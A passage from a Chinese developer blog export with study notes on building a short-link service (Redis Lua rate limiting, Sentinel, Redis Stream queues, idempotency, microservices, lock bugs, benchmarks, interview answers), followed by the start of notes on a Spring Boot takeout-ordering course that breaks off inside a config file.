<p>实现原理也比较简单，通过 Redis <code>increment</code> 命令对一个数据进行递增，如果超过 x 次就会返回失败。这里有个细节就是我们的这个周期是 x 秒，需要对 Redis 的 Key 设置 x 秒有效期。</p>
<p>但是 Redis 中对于 <code>increment</code> 命令是没有提供过期命令的，这就需要两步操作，进而出现原子性问题。</p>
<p>需要使用lua脚本</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 设置用户访问频率限制的参数</span></span><br><span class="line"><span class="keyword">local</span> username = KEYS[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">local</span> timeWindow = <span class="built_in">tonumber</span>(ARGV[<span class="number">1</span>]) <span class="comment">-- 时间窗口，单位：秒</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 构造 Redis 中存储用户访问次数的键名</span></span><br><span class="line"><span class="keyword">local</span> accessKey = <span class="string">&quot;short-link:user-flow-risk-control:&quot;</span> .. username</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 原子递增访问次数，并获取递增后的值</span></span><br><span class="line"><span class="keyword">local</span> currentAccessCount = redis.call(<span class="string">&quot;INCR&quot;</span>, accessKey)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 设置键的过期时间</span></span><br><span class="line">redis.call(<span class="string">&quot;EXPIRE&quot;</span>, accessKey, timeWindow)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 返回当前访问次数</span></span><br><span class="line"><span class="keyword">return</span> currentAccessCount</span><br></pre></td></tr></table></figure>

<p>@ConditionalOnProperty 不方便使用配置中心时候热更新</p>
<p>手动写要好改些</p>
<p>我们设置了一秒最多二十次访问</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/7f8799246c7ea320bee3bbb1f09a687bca59c617">feature:短链接后管通过风控保障系统 · 7f87992 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h4 id="短链接中台"><a href="#短链接中台" class="headerlink" title="短链接中台"></a>短链接中台</h4><p>根据接口进行流控，比如同一接口最大接受 20 QPS。</p>
<p>Sentinel 官网地址:<a href="https://sentinelguard.io/zh-cn/">home | Sentinel</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/69936f646a12c941be00252c10090ec74c8c8531">feature:短链接中台创建短链接接口请求限制 · 69936f6 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p>压测使用jmeter：<a href="https://blog.csdn.net/Zachyy/article/details/139717444">JMeter的基本使用与性能测试，完整入门篇保姆式教程-CSDN博客</a></p>
<p>流程基本就是创建线程组-&gt;添加取样器HTTP请求-&gt;HTTP请求添加HTTP信息头管理器-&gt;线程组添加查看结果树-&gt;运行查看结果</p>
<h3 id="消息队列重构短链接监控功能"><a href="#消息队列重构短链接监控功能" class="headerlink" title="消息队列重构短链接监控功能"></a>消息队列重构短链接监控功能</h3><p><a href="https://www.runoob.com/redis/redis-stream.html">Redis Stream | 菜鸟教程</a></p>
<p><a href="https://blog.csdn.net/li_w_ch/article/details/110638434">Redis Stream最全用法详解一_redis stream 有序？-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/hhl1011/p/16336429.html">SpringBoot 中使用Redis Stream 实现消息监听 - 胡海龙 - 博客园</a></p>
<p>创建 Redis Stream Key 相关配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">创建 Stream Key</span><br><span class="line">XADD &quot;short_link:stats-stream&quot; * &quot;New key&quot; &quot;New value&quot;</span><br><span class="line"></span><br><span class="line">创建消费者组</span><br><span class="line">xgroup create short_link:stats-stream short_link:stats-stream:only-group 0</span><br></pre></td></tr></table></figure>

<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/03fdfeaf734fe2eae7d2c5f8829ceb49b8bcb2d3">feature:使用Redis 充当消息队列 · 03fdfea · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="消息队列重复消费问题解决"><a href="#消息队列重复消费问题解决" class="headerlink" title="消息队列重复消费问题解决"></a>消息队列重复消费问题解决</h3><p>原因：</p>
<ul>
<li>网络问题</li>
<li>生产重试</li>
</ul>
<p>解决方法：幂等</p>
<p>为什么仅设置 2 分钟的过期时间：当生产者一直重发消息时，因为异常 redis中还有key，程序一直无法向下进行。而设计这两分钟后过期就恰好合理的解决了这个问题</p>
<p>如何应对海量幂等 Key 所消耗的内存？</p>
<ul>
<li>MySQL 或其它大数据量存储。</li>
<li>想办法改造数据。</li>
</ul>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/dab81279aaa6889cebeadbfbef2a51182d339f31">feature:短链接监控消费者幂等等逻辑处理 · dab8127 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/ed11dc9202251892512c3284726b35fc545a2ab2">feature:短链接延迟队列监控消费者幂等等逻辑处理 · ed11dc9 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接Redis缓存命名重构"><a href="#短链接Redis缓存命名重构" class="headerlink" title="短链接Redis缓存命名重构"></a>短链接Redis缓存命名重构</h3><p>一般redis缓存命名分隔最好用”:”，这样一些可视化攻击会有层次区分</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/c85c60ee0b0c1cd838fefce788da6906520f48cd">optimize:优化缓存命名、添加缓存常量 · c85c60e · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="短链接新增问题解决"><a href="#短链接新增问题解决" class="headerlink" title="短链接新增问题解决"></a>短链接新增问题解决</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">异常里为什么还查询数据库？</span><br><span class="line">靠什么判断短链接是否存在？布隆过滤器。</span><br><span class="line">有什么特点？</span><br><span class="line">● 查询是否存在，如果返回存在，可能数据是不存在的。</span><br><span class="line">● 查询是否存在，如果返回不存在，数据一定不存在。</span><br><span class="line"></span><br><span class="line">并发场景下会出现短链接生成重复</span><br><span class="line">同一毫秒下，大量请求相同的原始链接会生成重复短链接，并判断不存在，通过该方式访问数据库。为此，我们使用 UUID 替换了当前时间戳，来一定程度减少重复的短链接生成报错。</span><br></pre></td></tr></table></figure>

<p>如果有什么逻辑想要sping启动执行，可以写一个bean 实现InitializingBean 重写afterPropertiesSet方法</p>
<h2 id="微服务改造"><a href="#微服务改造" class="headerlink" title="微服务改造"></a>微服务改造</h2><h3 id="改造为微服务架构"><a href="#改造为微服务架构" class="headerlink" title="改造为微服务架构"></a>改造为微服务架构</h3><p>为什么要用微服务</p>
<ol>
<li>模块化和独立性</li>
</ol>
<ul>
<li>微服务：微服务架构通过将应用拆分为小型、独立的服务，每个服务专注于特定的业务功能。这种模块化的设计使得每个服务都可以独立开发、部署、扩展和维护。</li>
<li>单体服务：在单体服务中，应用是一个大而臃肿的单一单元，修改一个功能可能会影响整个应用的部署。</li>
</ul>
<ol start="2">
<li>技术异构性</li>
</ol>
<ul>
<li>微服务：允许使用不同的技术栈和编程语言来构建不同的服务，以适应不同的需求。每个微服务可以选择最适合其特定任务的技术。</li>
<li>单体服务：通常需要在同一技术栈下构建整个应用。</li>
</ul>
<ol start="3">
<li>独立部署和扩展</li>
</ol>
<ul>
<li>微服务：允许独立部署和扩展每个服务，这样可以更灵活地应对流量变化和需求变更。</li>
<li>单体服务：需要整体部署和扩展，可能会导致资源浪费或性能瓶颈。</li>
</ul>
<ol start="4">
<li>团队自治</li>
</ol>
<ul>
<li>微服务：每个微服务通常由一个小团队负责，团队可以根据其服务的需求进行独立的决策，提高了开发团队的自治性。</li>
<li>单体服务：整个应用的变更需要协调整个团队，可能导致开发速度较慢和沟通成本较高。</li>
</ul>
<ol start="5">
<li>弹性和容错性</li>
</ol>
<ul>
<li>微服务：由于每个服务都是独立的，可以更容易实现服务的弹性和容错。一个服务的故障不会影响整个应用。</li>
<li>单体服务：一个组件的故障可能导致整个应用的崩溃。</li>
</ul>
<ol start="6">
<li>可维护性和可测试性</li>
</ol>
<ul>
<li>微服务：每个微服务的小规模和清晰的职责范围使得代码更容易理解、维护和测试。</li>
<li>单体服务：单体应用的复杂性可能导致代码难以理解，难以维护和测试。</li>
</ul>
<p>本次使用的window启动，对应启动命令：startup.cmd -m standalone</p>
<p><a href="https://blog.csdn.net/hu_xian_/article/details/103961149">通过FeignClient调用微服务提供的分页对象IPage报错_type definition error</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/5b2ddb5f0830e63e9d3415de9f06e47963487ba9">optimize:重构短链接系统为微服务调用 · 5b2ddb5 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="网关开发"><a href="#网关开发" class="headerlink" title="网关开发"></a>网关开发</h3><p><a href="https://blog.csdn.net/dark868/article/details/106532628">通过AbstractGatewayFilterFactory实现拦截器-CSDN博客</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/72e1c78474f4b7367a4cd4a6b6fd1c7750ce2da0">feature:引入网关改造微服务 · 72e1c78 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="开发短链接聚合服务"><a href="#开发短链接聚合服务" class="headerlink" title="开发短链接聚合服务"></a>开发短链接聚合服务</h3><p><a href="https://blog.csdn.net/qq_38637558/article/details/105167120">SpringBoot搭建聚合项目_聚合项目-springboot-CSDN博客</a></p>
<p>未聚合，感觉没必要</p>
<h2 id="性能优化-amp-问题修复"><a href="#性能优化-amp-问题修复" class="headerlink" title="性能优化&amp;问题修复"></a>性能优化&amp;问题修复</h2><h3 id="布隆过滤器比分布式锁性能高多少倍-压测测试"><a href="#布隆过滤器比分布式锁性能高多少倍-压测测试" class="headerlink" title="布隆过滤器比分布式锁性能高多少倍-压测测试"></a>布隆过滤器比分布式锁性能高多少倍-压测测试</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/3e02813860d2765fa2551477dddc8d7256f00c2c">feature:添加短链接分布式锁写法编写和布隆过滤器进行对比 · 3e02813 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p>布隆过滤器：</p>
<p>线程数10</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241105142429354.png" alt="image-20241105142429354"></p>
<p>线程数40</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241105142642455.png" alt="image-20241105142642455"></p>
<p>分布式锁：</p>
<p>线程数10</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241105142749850.png" alt="image-20241105142749850"></p>
<p>线程数40</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20241105142903641.png" alt="image-20241105142903641"></p>
<p>发现性能都不怎么样</p>
<p>发现是getFavicon(requestParam.getOriginUrl()) 方法需要获取图标导致的（可以优化为发送延时消息队列，后面消费者在消费获取图标。但是用户体验不好，需要考虑用户体验和性能之间的平衡）</p>
<p>修改后</p>
<p>分布式锁</p>
<p>线程数10：10.9</p>
<p>线程数40：40.4</p>
<p>线程数100：88.1</p>
<p>1000：100.4</p>
<p>布隆过滤器</p>
<p>线程数10：11</p>
<p>线程数40：40.5</p>
<p>线程数100：184.0</p>
<p><strong>注意：如果要测试短链接跳转性能，需要关闭重定向</strong></p>
<p>后续需要恢复代码：<a href="https://gitee.com/xiong-changchun/shortlink/commit/86e385006f2133fbde8d8298f2ae334617b70ec5">feature:恢复代码，取消注释sentine相关代码 · 86e3850 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="注册用户异常信息返回错误"><a href="#注册用户异常信息返回错误" class="headerlink" title="注册用户异常信息返回错误"></a>注册用户异常信息返回错误</h3><p>错误代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void register(UserRegisterReqDTO requestParam) &#123;</span><br><span class="line">    if (!hasUsername(requestParam.getUsername())) &#123;</span><br><span class="line">        throw new ClientException(USER_NAME_EXIST);</span><br><span class="line">    &#125;</span><br><span class="line">    RLock lock = redissonClient.getLock(LOCK_USER_REGISTER_KEY + requestParam.getUsername());</span><br><span class="line">    try &#123;</span><br><span class="line">        if (lock.tryLock()) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Thread.sleep(1000000);</span><br><span class="line">            &#125; catch (InterruptedException e) &#123;</span><br><span class="line">                throw new RuntimeException(e);</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                int inserted = baseMapper.insert(BeanUtil.toBean(requestParam, UserDO.class));</span><br><span class="line">                if (inserted &lt; 1) &#123;</span><br><span class="line">                    throw new ClientException(USER_SAVE_ERROR);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (DuplicateKeyException ex) &#123;</span><br><span class="line">                throw new ClientException(USER_EXIST);</span><br><span class="line">            &#125;</span><br><span class="line">            userRegisterCachePenetrationBloomFilter.add(requestParam.getUsername());</span><br><span class="line">            groupService.saveGroup(requestParam.getUsername(), &quot;默认分组&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        throw new ClientException(USER_NAME_EXIST);</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_45626288/article/details/132245838">Redission 解锁异常：attempt to unlock lock, not locked by current thread by node id-CSDN博客</a></p>
<p>原因是如果a持有锁，b获取相同锁。会抛出throw new ClientException(USER_NAME_EXIST); 异常，但是因为有finally块，所以会尝试释放锁，但自己没有持有锁，会抛出其他的错误</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 Java 中，如果在 try 块和 finally 块中都抛出了异常，那么最终由 try-catch 或 **advice（例如 Spring 的 @ControllerAdvice）捕获的异常是 finally 块中抛出的异常，而不是 try 块中的异常。</span><br><span class="line"></span><br><span class="line">原因：</span><br><span class="line">finally 块优先级：无论 try 块中是否抛出了异常，finally 块都会执行。而且，如果 finally 块抛出了异常，它会覆盖 try 块中抛出的异常。</span><br><span class="line">try 块的异常会被 finally 块的异常覆盖：如果 finally 中的代码抛出了异常，那么 try 块中抛出的异常会被忽略，程序会抛出 finally 中的异常。</span><br></pre></td></tr></table></figure>

<p>对应修改commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/23773d27efefddafccd429689a3cf095a0cb9d9e">fix:用户注册时异常修复 · 23773d2 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p><a href="https://gitee.com/xiong-changchun/shortlink/commit/e03d3a4c284b259a0a99af7f362931641f593cd9">fix:更新用户信息时验证是否是当前用户 · e03d3a4 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="重构读写锁-amp-延迟队列功能"><a href="#重构读写锁-amp-延迟队列功能" class="headerlink" title="重构读写锁&amp;延迟队列功能"></a>重构读写锁&amp;延迟队列功能</h3><p>消息队列：跳转与记录访问监控分离</p>
<p> 延迟队列：拿不到锁，不要阻塞，放入延迟队列，稍后重试 </p>
<p>考虑一个场景：某热点短链接正在修改分组，拿到了写锁后，大量访问请求同时过来，假设修改分组占用写锁较长时间 再依次看以下几种方案： </p>
<p>（1）无消息队列，无延迟队列，跳转与监控不解耦 拿不到读锁，则该线程阻塞（需要等到写锁释放），tomcat中10个核心线程很快用完，紧接着200个最大线程也都阻塞，剩下的都在无界队列中，容易oom</p>
<p> （2）有消息队列，无延迟队列，跳转监控解耦 监控数据封装为消息，投入消息队列。固定10个消费者，拿不到读锁，阻塞，但最多只阻塞这10个消费者线程。其它消息就堆积在消息队列中，等着慢慢消费。 </p>
<p>（3）有消息队列，有延迟队列，跳转监控解耦 监控数据封装为消息，投入消息队列。固定10个消费者，拿不到读锁，再投入延迟队列，不阻塞，直接返回 </p>
<p>为什么用（2）不用（3）？即本章视频的改动点 消息队列中，我们可以固定消费者数量，实现匀速消费。例如，就10个消费者，全阻塞了也可以接受。我们不能接受的是（1）中有大量线程阻塞，乃至oom</p>
<p> 为什么落库、修改上读锁、写锁不再tryLock，而是直接lock，即阻塞等待拿锁？ 在（2）的情况下，最多是1个修改线程拿写锁和10个消费线程拿读锁，互相竞争。拿写锁阻塞会儿没关系，等10个消费完；拿读锁阻塞也没关系，最多就10个消费线程阻塞，都可以接受。redisson的读写锁是公平的。10个消费者释放后，就会轮到修改线程，不会被插队。所以不用担心永远拿不到写锁的情况。</p>
<p><a href="https://blog.csdn.net/dhklsl/article/details/118306570">详解Tomcat线程池原理及参数释义-CSDN博客</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1630499">tomcat的线程池机制-腾讯云开发者社区-腾讯云</a></p>
<p>使用@Deprecated 标记不在使用</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/c105ff5c32c0a4428d551923ebb7d1c327ef255f">fix:删除延迟队列功能&amp;修改同步获取读写锁 · c105ff5 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p>一些相关帖子：<a href="https://cloud.tencent.com/developer/article/1451045">【干货】MySQL 分库分表及其平滑扩容方案-腾讯云开发者社区-腾讯云</a></p>
<p><a href="https://developer.aliyun.com/article/1520930">Redis与数据库同步指南：订阅Binlog实现数据一致性-阿里云开发者社区</a></p>
<p><a href="https://blog.csdn.net/weixin_44893585/article/details/105874119">springboot是怎样简化开发的，原理是什么？_springboot简化了什么-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/niannujiao6/article/details/111325808">01SpringBoot底层实现原理及自动配置原理_indexdefinition spring boot-CSDN博客</a></p>
<p>[<a href="https://blog.csdn.net/Bravesk/article/details/132331326">已解决]springboot打包jar，部署运行jar包时找不到主清单属性_spring boot jar中没有主清单属性-CSDN博客</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/592581594">深入User space(用户空间) 与 Kernel space(内核空间) - 知乎</a></p>
<p><a href="https://blog.csdn.net/u010318270/article/details/81057692">写一个C程序判断系统是32或64位、大端或小端字节序_写一个c程序辨别系统是64位 or 32位-CSDN博客</a></p>
<p><a href="https://mp.weixin.qq.com/s/T6mMDdtTfBuIiEowCpqu6Q">搞懂异地多活，看这篇就够了</a></p>
<p><a href="https://www.cnblogs.com/Chenjiabing/p/12534346.html">接口限流看这一篇就够了！！！ - 爱撒谎的男孩 - 博客园</a></p>
<p><a href="https://mp.weixin.qq.com/s/xOzEj5HtCeh_ezHDPHw6Jw">mp.weixin.qq.com&#x2F;s&#x2F;xOzEj5HtCeh_ezHDPHw6Jw</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/437203229">面试官：Redis数据更新，是先更新数据库还是先更新缓存? - 知乎</a></p>
<p>一些面试题目：</p>
<ol>
<li><p>如何把一个长链接压缩转换为短链接？</p>
<p>首先设计的时候我考虑是缺点性转换还是非确定性转换，认为确定性转换作用不大。因为我们之后可能还需要更新跳转链接。因此我们生成的短链接是通过跳转链接 + uuid 拼接然后使用MurmurHash 进行计算，然后进行base32编码。这个过程中，我们生成的短链接会判断是否之前已经生成过了，我们使用布隆过滤器来进行判断这个时候。</p>
</li>
<li><p>短链接跳转原始长链接访问原理？</p>
<p><del>这个项目进行了分库分表。我们的短链接表，根据gid（短链接分组标识）进行分表</del></p>
<ol>
<li>通过短链接缓存获取对应的原始连接；（获取到了服务端发送重定向返回到原始链接）</li>
<li>如果原始连接缓存失效则需要通过数据库进行查询并再放入缓存；</li>
<li>首先通过短链接查询 <code>t_link_goto</code> 表获取 Gid，再通过 Gid 和短链接查询 <code>t_link</code> 中的原始链接</li>
</ol>
</li>
<li><p>为什么需要 t_link_goto</p>
<p>因为咱们短链接表使用的是 Gid 进行分表，用户通过浏览器访问短链接时，仅有短链接值，没有 Gid 的，所以我们就要建立个路由表，也就是 t_link_goto 进行缓存短链接和 Gid 的关系。避免通过短链接查询数据库表出现读扩散问题</p>
</li>
<li><p>短链接和原始长链接如何存储（分库分表）？</p>
<p>我们创建了t_link表存储了短链接和长链接的对于信息，并且我们还基于gid进行分表</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title>瑞吉外卖学习相关记录</title>
    <url>/2024/06/23/ruiji-waimai/</url>
    <content><![CDATA[<p>黑马瑞吉外卖</p>
<span id="more"></span>

<p>瑞吉外卖学完了就黑马点评</p>
<h2 id="相关分析"><a href="#相关分析" class="headerlink" title="相关分析"></a>相关分析</h2><ul>
<li><p>为啥配置@Configuration 和继承WebMvcConfigurationSupport 然后重写addResourceHandlers就能生效，分析下springboot的启动流程</p>
</li>
<li><p>&#96;&#96;&#96;<br>registry.addResourceHandler(“&#x2F;backend&#x2F;<strong>“).addResourceLocations(“classpath:&#x2F;backend&#x2F;“);<br>registry.addResourceHandler(“&#x2F;front&#x2F;</strong>“).addResourceLocations(“classpath:&#x2F;front&#x2F;“);</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  1. **`registry.addResourceHandler(&quot;/backend/\**&quot;)`**:</span><br><span class="line">     - 这部分代码告诉Spring MVC，所有以`/backend/`开头的URL请求（例如`/backend/some-file.js`）都应该被处理为静态资源请求。</span><br><span class="line">  2. **`addResourceLocations(&quot;classpath:/backend/&quot;)`**:</span><br><span class="line">     - 这部分代码指定了静态资源的实际存储位置。在这里，`classpath:/backend/`表示资源文件位于应用程序的类路径中的`/backend/`文件夹。</span><br><span class="line">     - 当用户请求一个以`/backend/`开头的URL时，Spring MVC将从`classpath:/backend/`目录中查找并返回相应的资源。</span><br><span class="line">     - 在 `addResourceLocations(&quot;classpath:/backend/&quot;)` 中，`classpath` 指的是 Java 类路径，它表示在应用程序运行时 JVM 用于查找类文件和资源文件的路径。</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  methods: &#123;</span><br><span class="line">    async handleLogin() &#123;</span><br><span class="line">      this.$refs.loginForm.validate(async (valid) =&gt; &#123;</span><br><span class="line">        if (valid) &#123;</span><br><span class="line">          this.loading = true</span><br><span class="line">          let res = await loginApi(this.loginForm)</span><br><span class="line">          if (String(res.code) === &#x27;1&#x27;) &#123;</span><br><span class="line">            localStorage.setItem(&#x27;userInfo&#x27;,JSON.stringify(res.data))</span><br><span class="line">            window.location.href= &#x27;/backend/index.html&#x27;</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">            this.$message.error(res.msg)</span><br><span class="line">            this.loading = false</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>这样用户直接访问&#x2F;backend&#x2F;index.html也行啊，得加下token什么的吧？</p>
<p><strong>看登录功能完善部分</strong></p>
<ul>
<li>之后测试下jmeter使用</li>
<li>之后看看session对象怎样保存的</li>
<li>之后跟断点研究下spring 过滤器和拦截器先后顺序或者写写代码看看日志打印顺序和函数栈</li>
<li>1</li>
</ul>
<h3 id="数据库表设置分析"><a href="#数据库表设置分析" class="headerlink" title="数据库表设置分析"></a>数据库表设置分析</h3><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/qq_42055933/article/details/132175997">快速理解Mybatis-plus中BaseMapper、IService和ServiceImpl-CSDN博客</a></p>
<h2 id="可能存在的问题及做出的优化"><a href="#可能存在的问题及做出的优化" class="headerlink" title="可能存在的问题及做出的优化"></a>可能存在的问题及做出的优化</h2><ul>
<li><p>数据安全相关问题-密码加下salt （todo）</p>
</li>
<li><p>数据安全相关问题-yml文件账号密码加密配置下（todo）</p>
<p>不过这种方法感觉有点像脱裤子放屁，像前端账号密码加密传到后端一样</p>
<p>有空可以抓包看下传输到数据库的流量是否是解密后的账号、密码</p>
</li>
<li><p>设置不够优雅</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ExceptionHandler(SQLIntegrityConstraintViolationException.class)</span><br><span class="line">public R&lt;String&gt; ExceptionHandler(SQLIntegrityConstraintViolationException ex)&#123;</span><br><span class="line">    if(ex.getMessage().contains((&quot;Duplicate entry&quot;)))&#123;</span><br><span class="line">        String[] split = ex.getMessage().split(&quot; &quot;);</span><br><span class="line">        String msg = split[2] + &quot;已存在&quot;;</span><br><span class="line">        return R.error(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看看咋改能更加好看（todo）</p>
<ul>
<li>针对每个接口写下postman接口（todo）</li>
<li>针对每个接口使用pytest或者其它测试框架测试（可以压测下？看看怎样提高抗压能力）</li>
</ul>
<h2 id="QA"><a href="#QA" class="headerlink" title="QA"></a>QA</h2><ol>
<li>为啥spring继承一个类比如MetaObjectHandler 然后重载某些函数，就能够全局生效了</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring 之所以能实现像 MetaObjectHandler 这样的类的全局生效，主要依赖于 Spring 框架的依赖注入和 AOP（面向切面编程）机制。</span><br><span class="line"></span><br><span class="line">以下是大致原理：</span><br><span class="line"></span><br><span class="line">依赖注入 (DI)：当你继承 MetaObjectHandler 并实现其中的方法时，Spring 会将该类注册为一个 Bean。通过依赖注入，Spring 可以在系统的任何地方自动使用这个实现类。例如，在 MyBatis Plus 中，MetaObjectHandler 是用于自动填充字段（如创建时间、更新时间）的处理器。只要你将自定义的 MetaObjectHandler 实现类注册为 Spring Bean，MyBatis Plus 会自动注入该 Bean 并使用它。</span><br><span class="line"></span><br><span class="line">AOP 切面编程：Spring 利用了 AOP 技术，将一些额外的逻辑切入到目标方法之前或之后执行。像 MetaObjectHandler 这样的类，会在 MyBatis 的某些操作（如 insert 或 update）时，触发字段的自动填充功能。Spring AOP 或 MyBatis 内部通过拦截器机制，将 MetaObjectHandler 的相关逻辑插入到数据库操作流程中。</span><br><span class="line"></span><br><span class="line">SPI（服务提供者接口）机制：有些框架，比如 MyBatis Plus，利用了 Java 的 SPI 机制，自动加载特定的接口实现类。你只需要实现并注入该接口的实现类，框架在启动时会自动扫描并加载这些实现，以便在全局范围内应用。</span><br><span class="line"></span><br><span class="line">所以，Spring 的这种机制使得你只需要实现特定接口或继承特定类，Spring 就会自动管理这些类的生命周期，并将它们注入到需要的地方，从而实现全局生效的效果。</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>研究@RequestBody DishDto dishDto 是怎样绑定的，感觉应该是set赋值。所以一般实体类或者dto得加@Data注解</p>
</li>
<li><p>map是接口，接受的时候选择的map实现类是哪个，是怎样选择的呢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public R&lt;User&gt; login(@RequestBody Map map, HttpSession session)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>GPT解释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在Spring MVC框架中，方法参数的类型决定了Spring容器会注入的具体实现类。</span><br><span class="line"></span><br><span class="line">对于Map接口，Spring会根据参数类型和实际传入的内容来选择具体的实现类。默认情况下，当参数是Map时，Spring MVC会使用LinkedHashMap作为默认实现类来接收从HTTP请求体中解析出的数据。这是因为LinkedHashMap保持了插入顺序，并且在多数情况下是处理表单数据和JSON数据的合适选择。</span><br><span class="line"></span><br><span class="line">具体选择的过程如下：</span><br><span class="line"></span><br><span class="line">解析请求体：在处理@RequestBody注解时，Spring MVC会使用消息转换器（HttpMessageConverters）将请求体中的数据解析为相应的Java对象。对于application/json类型的数据，Spring会使用MappingJackson2HttpMessageConverter将JSON数据转换为Java对象。</span><br><span class="line"></span><br><span class="line">确定Map实现类：在解析时，如果目标参数类型是Map接口，Spring会实例化一个LinkedHashMap来承载解析后的数据。LinkedHashMap是Java标准库中的一种Map实现，能够保证插入顺序，并且通常性能良好。</span><br><span class="line"></span><br><span class="line">因此，在login(@RequestBody Map map, HttpSession session)这个方法中，如果请求体包含JSON数据，Spring会自动将该数据转换为一个LinkedHashMap对象，并传递给map参数。</span><br></pre></td></tr></table></figure>



<h2 id="环境相关配置"><a href="#环境相关配置" class="headerlink" title="环境相关配置"></a>环境相关配置</h2><p>课程相关资料地址：<a href="https://pan.baidu.com/s/1bxEy2bHiCYQtouifUppsTA">https://pan.baidu.com/s/1bxEy2bHiCYQtouifUppsTA</a> 提取码：1234</p>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>application.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">reggie_take_out</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">druid:</span></span><br><span class="line">      <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/reggie?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;allowPublicKeyRetrieval=true</span></span><br><span class="line">      <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="comment">#在映射实体或者属性时，将数据库中表名和字段名中的下划线去掉，按照驼峰命名法映射</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span 